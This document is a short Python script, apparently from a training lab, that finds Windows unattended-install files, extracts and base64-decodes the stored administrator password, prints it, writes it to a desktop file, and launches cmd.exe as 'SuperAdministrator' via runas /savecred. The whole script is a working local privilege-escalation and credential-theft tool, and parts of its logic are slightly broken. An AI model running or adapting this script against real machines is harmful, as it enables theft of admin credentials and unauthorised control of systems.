import os
import re
import base64
import subprocess

def find_unattended_files():
    paths = [
        "C:\\Windows\\Panther\\Unattend.xml",
        "C:\\Windows\\Panther\\Autounattend.xml",
        "C:\\Windows\\System32\\sysprep\\sysprep.inf"
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return None

def extract_password(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()
            match = re.search(r'<AdministratorPassword>\s*<Value>(.*?)</Value>', content, re.DOTALL)
            if match:
                password_value = match.group(1).strip()
                plain_text_match = re.search(r'<PlainText>(.*?)</PlainText>', content)
                if plain_text_match and plain_text_match.group(1).lower() == 'false':
                    return None
                return password_value
            else:
                return None
    except Exception as e:
        return None

def decode_password(password):
    if re.fullmatch(r'^[A-Za-z0-9+/=]+$', password) and len(password) % 4 == 0:
        try:
            return base64.b64decode(password).decode('utf-8')
        except Exception as e:
            return password
    else:
        return password
    
def open_admin(admin_username, password):
    tmp = "C:\\Users\\Student\Desktop\\password.txt"

    with open(tmp, "w") as f:
        f.write(password)

    subprocess.run(f'runas /user:{admin_username} /savecred "cmd.exe"', shell=True)
    os.remove(tmp)

file = find_unattended_files()
if file:
    password = extract_password(file)
    if password:
        decoded_password = decode_password(password)
        print("Contraseña encontrada:", decoded_password)
    else:
        print("No se pudo extraer la contraseña o no era texto plano.")
    open_admin("SuperAdministrator", password)
else:
    print("No se encontró ningún archivo de configuración desatendida.")